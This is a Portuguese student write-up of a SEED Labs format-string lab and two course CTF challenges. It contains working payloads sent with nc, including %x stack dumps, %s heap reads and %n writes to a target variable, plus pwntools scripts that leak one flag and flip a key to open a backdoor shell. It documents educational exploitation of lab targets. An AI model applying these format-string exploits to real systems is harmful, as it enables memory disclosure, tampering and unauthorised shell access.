# Trabalho realizado na Semana #6

## **Seed Labs**

## Preparação

### Desativar <em>countermeasures<em>:

Desativar <em>Address Space Randomization<em>:

    sudo sysctl -w kernel.randomize_va_space=0

StackGuard e Non-Executable Stack podem ser desativadas na compilação.

## Tarefa 1

**Objetivo:** Forçar o crash do programa

**Conclusão** Para causar o crash do programa basta enviar "%s". Ao enviar o %s o programa vai procurar na stack uma string que não existe, causando um crash.

    echo %s | nc 10.9.0.5 9090

## Tarefa 2A

**Objetivo** Imprimir dados da stack do programa do servidor.

**Procedimento** Descobrir quantos %x são necessários para imprimir a variável que contém o nosso input.
Utilizando o seguinte código auxiliar python, podemos verificar que com 64 %x, o nosso input é impresso.
```python
    s = "AAAA" + "(%x)"*64
    fmt  = (s).encode('latin-1')

    with open('stack', 'wb') as f:
    f.write(fmt)
```

```sh
    cat stack | nc 10.9.0.5 9090
```
Output no server:

```
    server-10.9.0.5 | AAAA(11223344)(1000)(8049db5)(80e5320)(80e61c0)(ffcd8bf0)(ffcd8b18)(80e62d4)(80e5000)(ffcd8bb8)(8049f7e)(ffcd8bf0)(0)(64)(8049f47)(80e5320)(4d8)(ffcd8cf4)(ffcd8bf0)(80e5320)(935f720)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(0)(5975b700)(80e5000)(80e5000)(ffcd91d8)(8049eff)(ffcd8bf0)(104)(5dc)(80e5320)(0)(0)(0)(ffcd92a4)(0)(0)(0)(104)(41414141)The target variable's value (after):  0x11223344
    server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

Como é possível observar pelo output do servidor, o nosso input, "AAAA", (41414141), é impresso, utilizando 64 %s.


## Tarefa 2B

**Objetivo** Imprimir dados da heap do programa do servidor.

**Procedimento** Sabendo que com 64 %x podemos ter acesso ao valor do nosso input, podemos colocar o endereço que pretendemos ler no inicio da string de input.

```py
    #Read from heap T2.B
    s = "%64$s"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x080b4008 #secret message address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')
    with open('heap', 'wb') as f:
    f.write(content)
```
A string de input será "%64$s\x08\x40\x0b\x08".

```
    cat heap | nc 10.9.0.5 9090
```
Output no server:
```
    server-10.9.0.5 |@
                    (A secret message
    server-10.9.0.5 | )
```
Como pretendido, a mensagem é impressa com sucesso.


## Tarefa 3A

**Objetivo** Alterar o valor da variável target.

**Procedimento** 

```py
    s = "%64$n"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x080e5068 #target variable address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')

    # "\x68\x50\x05\x08%64$n"
    with open('writeheap', 'wb') as f:
    f.write(content)
```

```
    cat writeheap | nc 10.9.0.5 9090
```

Output no server:
```
    server-10.9.0.5 | hThe target variable's value (after):  0x00000004
    server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

A string de input será:  **"\x68\x50\x05\x08%64$n"**.<br/>
Ao enviar "%64$n" na format string, o %n pega no endereço na posição 64 da stack e reescreve o seu conteúdo com o número de bytes impressos.
Isto faz com que seja escrito o valor 0x4 no endereço de target, que é o comprimento do próprio endereço.

## Tarefa 3B

**Objetivo** Alterar o valor da variável target para 0x00005000

**Procedimento**

```py
    content = bytearray(0x00 for i in range(N))
    s = "%64$20476x" + "%64$n"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x080e5068 #targer variable address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')
                    
    with open('writeheap2', 'wb') as f:
    f.write(content)
```

A string de input será: **"\x68\x50\x05\x08%64$20476x%64$n"**. <br>
O número de bytes escritos que queremos será 0x5000 em decimal: 20480.
Ao utilizar "%64$20476x" adicionamos 20476 caracteres vazios, que somando com o comprimento do endereço de memória, que é 4, obtemos o número de bytes pretendido.
Ao enviar "%64$n" na format string, o %n pega no endereço na posição 64 da stack e reescreve o seu conteúdo com o número de bytes impressos.

```
    cat writeheap2 | nc 10.9.0.5 9090
```

```
    server-10.9.0.5 | h



    ...



    80e5068The target variable's value (after):  0x00005000
```


## **CTF - Desafio 1**

## Análise do programa vulnerável

Utilizando o checksec podemos perceber que a execução da stack está desativada, que existe canários a proteger o return address.
O mais importante de perceber é que as posições do binário não estão randomizadas

```
    [12/04/21]seed@VM:~/.../CTF6.1$ checksec program
    [*] '/home/seed/Desktop/CTF6.1/program'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
```

Analisando o código, sabemos que a linha onde a vulnerabilidade é a seguinte:

```c
    printf(buffer);
```

Esta vulnerabilidade de format string permite-nos ler e escrever endereços de memória.

Para obter a flag, teremos de saber endereço de memória onde esta se encontra

## Endereço de memória da variável flag

Para obter este endereço basta utilizar o gdb do seguinte modo.

```
    [12/04/21]seed@VM:~/.../CTF6.1$ gdb ./program
    gdb-peda$ p &flag
    $1 = (char (*)[40]) 0x804c060 <flag>    
```

## Posição da stack onde se encontra o buffer

Ao inserir no programa o input "AAAA%x" percebemos que o buffer é o primeiro valor que o printf vai buscar.

```
    [12/04/21]seed@VM:~/.../CTF6.1$ ./program 
    Try to unlock the flag.
    Show me what you got:AAAA%x
    You gave me this: AAAA41414141
```

## Obter a flag

Para obter a flag, basta colocar o endereço de memória que queremos ler no início do buffer, seguido de um "%s".
O código python será o seguinte:

```py
    from pwn import *
    import sys

    LOCAL = False

    if LOCAL:
        p = process("./program")
        pause()
    else:    
        p = remote("ctf-fsi.fe.up.pt", 4004)

    # Initialize the content array
    N = 1500
    content = bytearray(0x42 for i in range(N))

    s = "%s"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x0804c060 #secret message address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')

    p.recvuntil(b"got:")
    p.sendline(content)
    p.interactive()
```

Ao correr o script python, obtemos a flag: flag{b02bd110417e7df6093ec3c0a26102aa}

```
    [12/04/21]seed@VM:~/.../CTF6.1$ python3 exploit_example.py 
    [+] Opening connection to ctf-fsi.fe.up.pt on port 4004: Done
    [*] Switching to interactive mode
    You gave me this: `\xcflag{b02bd110417e7df6093ec3c0a26102aa}
```


## **CTF - Desafio 2**

## Análise do programa vulnerável

Utilizando o checksec podemos perceber que a execução da stack está desativada, que existe canários a proteger o return address.
O mais importante de perceber é que as posições do binário não estão randomizadas

```
    [12/04/21]seed@VM:~/.../CTF6.1$ checksec program
    [*] '/home/seed/Desktop/CTF6.1/program'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
```

Analisando o código, sabemos que o program verifica o valor da variável global key. Se key for igual a 0xbeef, o programa executa /bin/bash, o que nos permitirá obter a flag. 

```c
    if(key == 0xbeef) {
        printf("Backdoor activated\n");
        fflush(stdout);
        system("/bin/bash");    
    }
```

Sabemos também que a linha onde a vulnerabilidade é a seguinte:

```c
    printf(buffer);
```

Esta vulnerabilidade de format string permite-nos ler e escrever endereços de memória. Teremos então de alterar o valor da key para 0xbeef.

## Endereço de memória da variável key

Para obter este endereço basta utilizar o gdb do seguinte modo.

```
    [12/04/21]seed@VM:~/.../CTF6.2$ gdb ./program 
    gdb-peda$ p &key
    $1 = (int *) 0x804c034 <key> 
```

## Posição da stack onde se encontra o buffer

Ao inserir no programa o input "AAAA%x" percebemos que o buffer é o primeiro valor que o printf vai buscar.

```
    [12/04/21]seed@VM:~/.../CTF6.2$ ./program 
    There is nothing to see here...AAAA%x
    You gave me this:AAAA41414141[12/04/21]
```

## Obter a flag

Para o programa executar /bin/bash, vamos alterar a variável key. Como já sabemos o seu endereço (0x804c034), vamos utilizar %n para reescrever o seu conteúdo.
Como queremos que flag = 0xbeef, teremos de imprimir 48879 bytes.


```py
    from pwn import *
    import sys

    LOCAL = False

    if LOCAL:
        p = process("./program")
        pause()
    else:    
        p = remote("ctf-fsi.fe.up.pt", 4005)

    # Initialize the content array
    N = 1500
    content = bytearray(0x42 for i in range(N))

    s = "%1$48875x" + "%1$n"
    fmt  = (s).encode('latin-1')
    content[4:len(fmt)] = fmt
    number  = 0x0804c034 #secret message address
    content[0:4]  =  (number).to_bytes(4,byteorder='little')


    p.sendline(content)
    p.interactive()
```

O uso de $ permite aceder diretamente à posição da stack que desejamos, neste caso, a primeira posição, daí o uso de "%1$n" e "%1$48875x".
"%1$48875x" permite-nos imprimir 48895 caracteres nulos, que somado com os 4 bytes do endereço de memória, dá 48879 (0xbeef).

Ao correr o script python obtemos o seguinte:

```
    [12/04/21]seed@VM:~/.../CTF6.2$ python3 exploit_example.py 
    [+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
    [*] Switching to interactive mode
    There is nothing to see here...You gave me this:4\xc

    ...

                                        804c034BBBBBBBBBBBBBBBBackdoor activated
    [*] Got EOF while reading in interactive
    $  

```

A Backdoor foi ativada e podemos utilizar cat para obter a flag:

```
    $ cat flag.txt
    flag{c192455b887c8f898145d852ef78a169}
```